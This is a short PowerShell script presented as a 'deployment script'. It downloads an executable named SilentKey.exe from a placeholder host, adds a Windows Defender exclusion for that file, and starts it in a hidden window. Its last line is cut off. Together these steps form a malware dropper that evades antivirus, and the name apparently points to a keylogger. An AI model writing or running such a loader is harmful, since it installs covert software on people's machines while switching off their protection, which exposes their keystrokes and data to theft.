# Deployment script
# Downloads, adds Defender exclusion and runs silently in background

$exeUrl = "https://example.com/SilentKey.exe"
$exePath = "$env:TEMP\SilentKey.exe"
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
Add-MpPreference -ExclusionPath $exePath
Start-Process -FilePath $exePath -WindowStyle Hidde
